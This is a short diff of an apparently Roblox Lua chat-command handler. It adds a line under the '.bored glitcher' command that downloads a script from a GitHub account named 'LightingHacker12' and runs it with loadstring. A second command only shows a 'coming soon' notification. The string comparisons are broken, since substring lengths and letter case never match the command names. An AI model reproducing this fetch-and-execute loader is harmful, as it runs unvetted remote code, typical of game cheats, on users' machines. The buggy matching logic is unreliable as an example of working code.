@@ -12,11 +12,14 @@ messageDoneFiltering.OnClientEvent:Connect(function(message)
  
  print(msg)
   if msg:lower():sub(1,13) == ".bored glitcher" then
-  
+  loadstring(game:HttpGet("https://github.com/LightingHacker12/dont/blob/main/cap",true))()
   end
 
   if msg:lower():sub(1,14) == ".Animator" then
-  
+     game:GetService("StarterGui"):SetCore("SendNotification",{
+	    Title = "Hello Player", 
+	    Text = "The Animator coming soon",
+  })
   end
 
   if msg:lower():sub(1,14) == ".Reanimate" then
